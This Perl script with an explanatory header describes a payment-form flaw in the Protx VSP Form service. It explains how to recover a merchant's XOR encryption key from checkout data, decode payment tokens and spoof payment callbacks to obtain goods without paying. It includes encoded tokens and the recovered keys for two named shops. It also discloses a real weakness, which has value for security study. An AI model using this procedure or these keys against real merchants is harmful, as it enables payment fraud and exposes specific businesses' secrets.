#!/usr/bin/perl

=pod
Protx "VSP Form" service flaw demonstration
-------------------------------------------

BACKGROUND: the simplest and most common way to integrate with payment service
providers is to have the shopping basket create an HTML form containing hidden
fields, which contain the order number, amount, currency, usually some
customer details, and sometimes the URL which the provider calls to let the
shop know that a payment was made.

RISKS: it is trivial to alter form information before it is sent - there's
even a FireFox plugin which lets you do it without any coding knowledge.
Altering the payment data would allow you to pay less than the shopping
basket intended for the goods.  Furthermore, if the payment information
sent to the provider includes the URL that the provider calls to notify
the system of payment, an attacker could put themselves in place of the
provider.
Protx encrypt this 'callback' information using the same encryption key
as used to send it - we can easily determine this key without anyone
realising, and in almost all cases tell the website that payment for a
given order was made successfully, and hopefully receive the goods a few
days later.
This risk applies to Protx due to the trivial encryption.

WORKAROUND: good website owners will always manually check with their payment
provider that payment was made in full before sending goods out, but
many small businesses do not have time for that, and do it once per month
as an accounting function.

DETAILS: Protx payment tokens are "encrypted" (read: obfuscated) with a simple
XOR of the payment data with a repeating password.  Generally the password
is 16 ASCII characters, but the length can be determined easily.

To determine a Protx customer's encryption key, simply visit their website,
add something to your basket, go to the checkout, and fill in every field
you can with as many "A" characters as possible.  This will mean that the
encrypted string contains long sequences of "A".
Submit the checkout form, and the website will generate another form which
it will ask you to submit, in order to link to Protx's site.  Don't submit
the form - instead grab the base64 encoded hidden form field.
After decoding the string from base64, exclusive-or it with the same length
string filled with "A"s, and you'll see repeating sections - find the most
often repeated section, generally 16 characters, and that should be your
encryption key.  Happy shopping!

=cut

# EXAMPLE ENCODED FIELDS:

# treehuggermums.co.uk:
$enc='DzYeBRpLDk80LCMXVDMsdWBhR0c0VDVCGTd6Q1tJVAh/EAUTB1w0VA5+ADA5QSBdKjACCAVNM1gZfh4dHBVEezghBEcmTDlUEjA0JzsrWVAtJwBbWhYtQABtMwAMAgxNPjQVExhMN0RZIChcHAxLSzE8AE4FWCNaEi0zXQoEO0grPAQZW0kyR1EFJhsFEhZdDAE8XB1NLkdNbGgFHhBKTCs2FQkAXj1SBS4yHxpJB1d3JhtOBlE1R1gzJgsEAgpMdjATPgVLNUMPbTcaGUEnTSonHwwQSxRWGiZ6MygmJXkYEjEgNHgbdjYCBjMoJiV5GBIxIDR4G3Y2AgZSKCYleRgSMSA0eBt2NgIGMygmJXkYEjEgNHgbdjYCBjNPJBFLLTwdBAd8F1YeL3oTKQZKWzY+ViIaVy5WFDcJBwQFAUpkEjEgNHgbdjYCBjMoJiV5GBIxIDR4G3Y2AgYzKCYleRh1Mw4bTTtUAwUmClRBMl03Nx8TMHQ7Xht+NBMFAhd4LSEVBB1MPVASMSoHBBRKWzZ9BQpTfT9bHjUiABAmAFwrNgMSSHgbdjYCBjMoJiV5GBIxIDR4G3Y2AgYzKCYleRgSMSA0Mxt2NgIGMygmJXkYEjEgNHgbdjYCBjMoJiV5GBIxIDR4UHY2AgYzKCYleRgSMSA0eBt2NgIGMygmJXkYEjEgNHgbPTYxIAsFC0QQGAEXSH9sNF4DJiNSIg4KXz08HUFdfihSFjdnMBsOEFkwPVlBXX4YHlEHIh4AEQFKIAMfEgF6NVMSfjMXGhNCejA/HAgbXhtTEzEiARpaJXkYEjEgNHgbdjYCBjMoJiV5GBIxIDR4G3Y2AgYzKCZueRgSMSA0eBt2NgIGMygmJXkYEjEgNHgbdjYCBjMoJm55GBIxIDR4G3Y2AgYzKCYleRgSMSA0eBt2NgIGMygmJTIYIRcYGVV6HzYRIFtjMgpRLTYUQT5QNFATLCpSQSAWXTgnUCMHUC5WHi1uUkEgJhF/ERkNGVA0UCcsNAYqCABdZBIxIDR4G3Y2AgYzKCYleRgSMSA0eBt2NgIGMygmJXkYdTIABlI/Q0pyfVVYV1QdeRwCBhRXM1RQYzcAAAkQGCk/ERgGTDNDTXJ9Q1tJVAhjaUpQRxdqBw==';

# avonar.com:
$enc='Lzc3EgcGGjMFOFdSClledVRgbkNZRH17YBZeWEIBHn5IandPXVINPjQlVllUFlcEOwJ/Mg0HLTkvJ0deWAFXclkTeTsBED0+KzpWRYMcSg0QNTECSDA8Lic6E3JWHRgqFzUqUDsBLSgjJEBiZSNXKw0mKUxHWzk8MXlSQVgBCzFXMTYbRwAmKig8QBlHBxplPzMwGh0GKx4UGw5fQxsaeVZ9LgEfWi89KTlSRRkMBS5WITYEGg1gOy4nFXRCHB4sFDcrMyUVJyd7NnNWGQwFLl8RLAUcGyMuNBlSWlJSKwI4Exg3KTUPCgcWcnZ2LisCOBMYNyk1DwoHFnJ2di4rAjgTGDcpNQ8KBxZyEWEKBCcWIBw7CR0idjU2X1JELws1Fjw4BEYXISZgFVpbWwYEJDg2PQQNBz12BxZydnYuKwI4Exg3KTUPCgcWcnZ2LisCOBMYNyk1DwoHFnJ2di4rAjgTGDcpNQ8KBxZydnYuKwI4Exg3KTUPCgcWcnZ2LitOcxMYNyk1DwoHFnJ2di4rAjgTGDcpNQ8KBxZydnYuKwI4Exg3KTUPCgcWcnZ2LmdJNTM3FxofPSMvJVY6PToEKg03PVYjHSAsIjheEXUGBi8QPD4mBwc6CCkzVgpWDltjSDM4';

use MIME::Base64 qw(decode_base64);

$cipher=decode_base64($enc); # un-base64 it..

# ONCE YOU HAVE THE PASSWORD, PUT IT HERE:

#$pass='YSpau9Z7wCGrigd8'; # treehuggermums.co.uk
$pass='yRYvhtNKFW377ojC'; # avonar.com

# STEP 1: find the key:

if($pass eq ''){
	$step1= 'A' x length($cipher); # long string of "A"
	$plainpassword = $step1 ^ $cipher; # XOR
	
	print "If you haven't yet got the password, this should contain the repeated password in many places:\n\n$plainpassword\n\nOnce you have it, re-run the script having put the password in under STEP 2.\n";


}else{

# STEP 2: use the repeated password to decode the string:

print "Decoding using password '$pass':\n\n";

# create a long version of the password:
$longpass=substr($pass x (2+length($cipher)/length($pass)),$i,length($cipher));

# decode:
$plain = $longpass ^ $cipher;

# split out form fields:
print join("\n",split('&',$plain))."\n";

}


